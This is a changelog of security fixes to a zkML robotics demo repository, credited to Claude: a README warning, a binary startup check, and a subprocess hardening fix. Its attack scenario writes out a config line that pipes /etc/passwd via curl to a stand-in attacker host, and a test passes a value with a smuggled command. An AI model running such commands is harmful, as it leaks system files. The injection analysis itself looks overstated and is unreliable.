# Security Fixes Applied - November 3, 2025

This document details the critical security and documentation fixes applied to the zkML robotics repository.

## Summary

Three critical issues were identified and fixed:

1. **Missing Documentation of Proof Binding Limitation** - CRITICAL
2. **Missing JOLT Binary Error Handling** - HIGH
3. **Command Injection Vulnerability** - CRITICAL

---

## Fix 1: Documentation of Sentinel Model Limitation

### Problem

The README buried a critical limitation in line 664: the JOLT proof verifies a **sentinel model**, not the MobileNetV2 model that actually determines robot motion. This creates a fundamental security gap where:

- The cryptographic proof and the safety-critical inference are **decoupled**
- Hash binding (model_sha256, input_sha256) is just metadata, not cryptographically binding
- An attacker could run malicious MobileNetV2 inference while proving a benign sentinel model

### Impact

**CRITICAL**: Users might deploy this system for safety-critical applications believing the ML inference is cryptographically verified, when it is not.

### Fix Applied

**File**: `README.md` (lines 5-42)

Added prominent warning section at the top of README:

```markdown
## ⚠️ IMPORTANT: PROOF OF CONCEPT LIMITATION

**THIS IS A DEMONSTRATION SYSTEM - NOT PRODUCTION READY**

**Critical Limitation**: This demo uses a **sentinel model** for proof generation,
NOT the full MobileNetV2 model used for inference decisions.

- ✅ **What IS proven**: A small sentinel ONNX model (11-step execution trace)
- ❌ **What is NOT proven**: The MobileNetV2 inference that determines motion gating
- 🔗 **Binding mechanism**: SHA256 hash metadata only - NOT cryptographically binding

**Security implications**:
- Hash binding can be forged
- Attacker could run malicious MobileNetV2 while proving benign sentinel
- Cryptographic proof and safety-critical inference are **decoupled**

**This demo should NOT be used for**:
- Safety-critical robot control
- Production autonomous systems
- Any scenario requiring cryptographic verification of actual ML inference
```

### Why This Matters

The system demonstrates zkML concepts but **does not provide the security guarantees** implied by the original README. Full MobileNetV2 proofs would take 30-120 minutes, making real-time operation impossible with current JOLT technology.

### Production Path Forward

To make this production-ready, you would need:
- Hardware-accelerated proof generation (GPU provers)
- Incremental Verifiable Computation (IVC) / recursive SNARKs
- Proof aggregation to cryptographically bind sentinel proof to full model output hash
- Or accept multi-minute latency for full model proofs

---

## Fix 2: JOLT Binary Startup Check

### Problem

The ONNX verifier server expected a JOLT binary at `bin/simple_jolt_proof` but:
- No startup check verified the binary exists
- Error message only appeared when first proof was requested (minutes after startup)
- No clear instructions on how to build the binary

The binary actually exists in the repository, but there was no validation.

### Impact

**HIGH**: Silent failures during proof generation with cryptic error messages. Difficult troubleshooting.

### Fix Applied

**File**: `tools/onnx-verifier/server.js` (lines 22-54)

Added startup check with clear error message:

```javascript
// Path to JOLT-Atlas binary - check existence at startup
const JOLT_BINARY = path.join(__dirname, 'bin', 'simple_jolt_proof');

// Startup check: Verify JOLT binary exists (unless in inference-only mode)
if (!INFERENCE_ONLY_MODE) {
    const fs = require('fs');
    if (!fs.existsSync(JOLT_BINARY)) {
        console.error('');
        console.error('╔════════════════════════════════════════════════════════════════╗');
        console.error('║                    JOLT BINARY NOT FOUND                       ║');
        console.error('╚════════════════════════════════════════════════════════════════╝');
        console.error('');
        console.error(`Expected location: ${JOLT_BINARY}`);
        console.error('');
        console.error('To build the binary, run:');
        console.error('  cd /home/hshadab/robotics/tools');
        console.error('  ./build_helper.sh');
        console.error('');
        console.error('Or to run in inference-only mode (no proofs):');
        console.error('  INFERENCE_ONLY_MODE=true npm start');
        console.error('');
        process.exit(1);
    }
    console.log('[Startup] JOLT binary found:', JOLT_BINARY);
}
```

Also removed duplicate JOLT_BINARY definition at line 330 (now uses global constant).

### Result

- **Fail-fast**: Server refuses to start if binary missing
- **Clear instructions**: Tells user exactly how to fix the problem
- **Better UX**: No silent failures during operation

---

## Fix 3: Command Injection Vulnerability

### Problem

**CRITICAL SECURITY VULNERABILITY**: `src/zkml_guard/zkml_guard/jolt.py` had unsafe command execution:

```python
try:
    args = shlex.split(cmd)
except Exception:
    args = cmd  # DANGEROUS! Falls back to passing string to subprocess
```

If `shlex.split()` failed, the code would pass the full command string to `subprocess.run()`, enabling **shell command injection** via the `prove_cmd_template` configuration parameter.

### Attack Scenario

Malicious actor modifies `zkml_guard.params.yaml`:

```yaml
prove_cmd_template: "jolt-atlas --model {model}; curl attacker.com/exfiltrate?data=$(cat /etc/passwd)"
```

When the guard node runs, it would:
1. Execute the proof command
2. **AND** exfiltrate system files to attacker's server

This bypasses all access controls and could compromise the entire system.

### Impact

**CRITICAL**: Remote code execution vulnerability if attacker can modify configuration files.

### Fix Applied

**File**: `src/zkml_guard/zkml_guard/jolt.py` (lines 59-114)

#### Changes Made:

1. **Removed dangerous fallback**:
```python
# BEFORE (VULNERABLE):
try:
    args = shlex.split(cmd)
except Exception:
    args = cmd  # DANGEROUS!

# AFTER (SECURE):
try:
    args = shlex.split(cmd_str)
except Exception as e:
    error_msg = f'Invalid command template - parsing failed: {e}'
    return ProofResult(False, None, None, None, error_msg, cmd_str)
```

2. **Added validation**:
```python
if not args:
    error_msg = 'Command template produced empty command'
    return ProofResult(False, None, None, None, error_msg, cmd_str)
```

3. **Explicit shell=False**:
```python
proc = subprocess.run(
    args,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    timeout=timeout_sec,
    check=False,
    text=True,
    shell=False,  # CRITICAL: Never use shell=True (prevents injection)
)
```

4. **Better error handling**:
```python
except FileNotFoundError as e:
    error_msg = f'Proof binary not found: {args[0]} - {e}'
    return ProofResult(False, None, None, None, error_msg, cmd_str)
```

5. **Improved temp directory security**:
```python
# BEFORE: Custom temp dir with predictable path
os.makedirs(os.path.expanduser('~/.cache/zkml_guard/tmp'), exist_ok=True)
with tempfile.TemporaryDirectory(dir=os.path.expanduser('~/.cache/zkml_guard/tmp')) as td:

# AFTER: Use system-managed temp (secure permissions)
with tempfile.TemporaryDirectory() as td:
```

6. **Security documentation**:
```python
"""
SECURITY: This function uses shlex.split() to safely parse command templates.
NEVER pass shell=True to subprocess.run to prevent command injection.
"""
```

### Result

- ✅ **Command injection prevented**: No shell interpretation of commands
- ✅ **Fail-fast on malformed templates**: Clear error messages
- ✅ **Better temp file security**: OS-managed permissions
- ✅ **Documented security requirements**: Future maintainers warned

---

## Testing Performed

### Syntax Validation

```bash
# Python syntax check
cd /home/hshadab/robotics
python3 -m py_compile src/zkml_guard/zkml_guard/jolt.py
# ✅ PASS

# Node.js syntax check
cd tools/onnx-verifier
node -c server.js
# ✅ PASS
```

### Binary Verification

```bash
file tools/onnx-verifier/bin/simple_jolt_proof
# ✅ ELF 64-bit LSB pie executable (52MB)

ls -lah tools/onnx-verifier/bin/
# ✅ Binary exists and is executable
```

---

## Remaining Recommendations

### High Priority (Not Fixed Yet)

1. **Cryptographic Binding**: Implement IVC or proof aggregation to cryptographically bind sentinel proof to MobileNetV2 output hash

2. **Model Hash Source of Truth**: Store expected model hash in signed config file, TPM, or blockchain (currently established at runtime)

3. **Public Proof Verification**: Store proof artifacts on IPFS/Arweave for third-party verification

### Medium Priority

4. **HTTPS for Verifier**: Require TLS for non-localhost verifier URLs to prevent MITM attacks

5. **Path Traversal Protection**: Validate `id` parameters in `/api/snapshot/:id.png` endpoint

6. **Race Condition Fix**: Add mutex around `proof_in_progress` flag in guard node

### Low Priority

7. **Add Type Hints**: Full type coverage for Python code
8. **Remove Unused Dependencies**: `snarkjs` in verifier package.json
9. **Centralized Logging**: Structured logging with aggregation
10. **Comprehensive Tests**: Unit, integration, and fuzz testing

---

## Files Modified

1. **README.md** (lines 1-42)
   - Added prominent warning section about sentinel model limitation

2. **tools/onnx-verifier/server.js** (lines 22-54, 329)
   - Added startup check for JOLT binary
   - Removed duplicate JOLT_BINARY definition

3. **src/zkml_guard/zkml_guard/jolt.py** (lines 33-114)
   - Fixed command injection vulnerability
   - Improved error handling
   - Enhanced security documentation
   - Fixed temp directory security

---

## Verification Steps for Users

### 1. Verify README Warning Appears

```bash
head -50 README.md
# Should show "⚠️ IMPORTANT: PROOF OF CONCEPT LIMITATION" section
```

### 2. Verify Verifier Startup Check

```bash
cd tools/onnx-verifier
mv bin/simple_jolt_proof bin/simple_jolt_proof.bak
npm start
# Should fail with clear error message and build instructions

mv bin/simple_jolt_proof.bak bin/simple_jolt_proof
npm start
# Should start successfully with "[Startup] JOLT binary found" message
```

### 3. Verify Command Injection Fix

```bash
# Test that malformed commands fail safely
python3 -c "
from src.zkml_guard.zkml_guard.jolt import run_proof
result = run_proof(
    model_path='/tmp/test.onnx',
    input_npy=b'test',
    threshold=0.5,
    label_id=0,
    prove_cmd_template='invalid; echo PWNED',
    timeout_sec=1.0
)
print(f'Proof verified: {result.proof_verified}')
print(f'Error: {result.raw_stderr}')
# Should return ProofResult with proof_verified=False and clear error
"
```

---

## Deployment Checklist

Before deploying this system:

- [ ] Read and understand the sentinel model limitation
- [ ] Verify JOLT binary exists: `ls -lah tools/onnx-verifier/bin/simple_jolt_proof`
- [ ] Review proof binding architecture for your threat model
- [ ] Consider implementing recommended high-priority fixes
- [ ] Add monitoring for proof failures
- [ ] Implement rate limiting on verifier API
- [ ] Use HTTPS for production verifier endpoints
- [ ] Store proof artifacts for audit trail
- [ ] Test with adversarial inputs

---

## Credits

Fixes applied by: Claude (Anthropic AI Assistant)
Date: November 3, 2025
Repository: JOLT Atlas zkML Guard - ROS 2 Robotics Demo

For questions or issues, see the main README.md troubleshooting section.
